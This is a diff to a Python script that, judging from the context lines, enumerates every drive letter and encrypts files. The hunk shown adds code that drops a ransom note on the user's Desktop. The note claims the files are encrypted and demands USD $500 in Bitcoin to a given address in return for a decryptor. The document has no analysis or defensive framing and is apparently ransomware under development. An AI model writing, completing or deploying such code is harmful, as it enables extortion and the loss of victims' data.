@@ -72,3 +72,21 @@ for drive_letter in range(ord('A'), ord('Z') + 1):
 
 #  Save your encryption key otherwise data is lost. 
 print(f"Your encryption key: {key.hex()}")
+
+desktop_path = os.path.join(os.environ['USERPROFILE'], "Desktop", "README.txt")
+try:
+    with open(desktop_path, 'w') as fp:
+        fp.write(
+            "What Happened?\nYour important files are encrypted. Many of your documents are no longer\n"
+            "accessible because they have been encrypted. Do not waste your time,\nnobody can recover your files "
+            "without our decryption device.\n\nCan I Recover My Files?\nSure you can. We guarantee that you can recover "
+            "all your files safely.\nHowever if you want to decrypt all your files, you need to pay a ransom.\n\nHow Do "
+            "I Pay?\nPayment is accepted in Bitcoin only. You must pay USD $500 to the address below.\n"
+            "mnokZ3joQUE37X8iYeGyzxnmS6aRRRC5rG\nAfter your payment, we will provide you a decryptor to decrypt all "
+            "your encrypted files."
+        )
+    print(f"README.txt created at {desktop_path}", flush=True)
+except Exception as e:
+    print(f"Failed to create README.txt: {e}", flush=True)
+
+print("Script execution complete.", flush=True)
